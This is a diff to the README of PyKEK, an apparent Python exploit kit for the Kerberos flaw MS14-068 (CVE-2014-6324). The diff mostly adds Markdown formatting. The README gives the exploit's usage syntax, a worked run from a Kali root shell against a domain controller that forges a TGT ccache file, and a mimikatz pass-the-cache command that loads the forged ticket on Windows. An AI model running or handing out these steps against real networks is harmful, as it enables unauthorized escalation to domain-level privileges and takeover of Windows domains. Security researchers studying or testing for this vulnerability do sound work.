@@ -2,12 +2,16 @@ Python Kerberos Exploitation Kit
 ===
 
 PyKEK (Python Kerberos Exploitation Kit), a python library to manipulate KRB5-related data. (Still in development)
+
 For now, only a few functionalities have been implemented (in a quite Quick'n'Dirty way) to exploit  MS14-068 (CVE-2014-6324) .
+
 More is coming...
 
 # Author
 Sylvain Monné
+
 Contact : sylvain dot monne at solucom dot fr
+
 http://twitter.com/bidord
 
 # Library content
@@ -24,15 +28,17 @@ To exploit MS14-068, you need :
  - A resource on domain B accessible to privileged user of domain A
 
 ## Usage :
+```
 USAGE:
 ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr>
 
 OPTIONS:
     -p <clearPassword>
  --rc4 <ntlmHash>
-
+```
 ## Example usage :
-# Linux (tested with samba and MIT Kerberos)
+### Linux (tested with samba and MIT Kerberos)
+```
 root@kali:~/sploit/pykek# python ms14-068.py -u user-a-1@dom-a.loc -s S-1-5-21-557603841-771695929-1514560438-1103 -d dc-a-2003.dom-a.loc
 Password: 
   [+] Building AS-REQ for dc-a-2003.dom-a.loc... Done!
@@ -45,8 +51,10 @@ Password:
   [+] Parsing TGS-REP from dc-a-2003.dom-a.loc... Done!
   [+] Creating ccache file 'TGT_user-a-1@dom-a.loc.ccache'... Done!
 root@kali:~/sploit/pykek# mv TGT_user-a-1@dom-a.loc.ccache /tmp/krb5cc_0 
+```
+### On Windows
 
-# Windows
-On a windows machine (using Python for Windows) :
+```
 python.exe ms14-068.py -u user-a-1@dom-a.loc -s S-1-5-21-557603841-771695929-1514560438-1103 -d dc-a-2003.dom-a.loc
-mimikatz.exe "kerberos::ptc TGT_user-a-1@dom-a.loc.ccache" exit
+mimikatz.exe "kerberos::ptc TGT_user-a-1@dom-a.loc.ccache" exit`
+```
